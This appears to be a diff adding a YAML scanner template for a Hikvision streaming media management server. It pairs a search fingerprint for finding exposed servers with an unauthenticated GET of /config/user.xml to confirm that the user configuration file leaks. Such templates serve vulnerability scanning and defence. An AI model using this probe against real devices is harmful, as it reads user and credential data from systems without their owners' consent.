@@ -1,0 +1,19 @@
+name: HIKVISION流媒体管理服务器
+manual: true
+query: body="easyui/themes/particular_blue.css"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /config/user.xml
+      headers:
+        Accept: test/html,application/xhtml+xml,application/x  ml;q=0.9,*/*;q=0.8
+        User-Agent: Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"name")
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
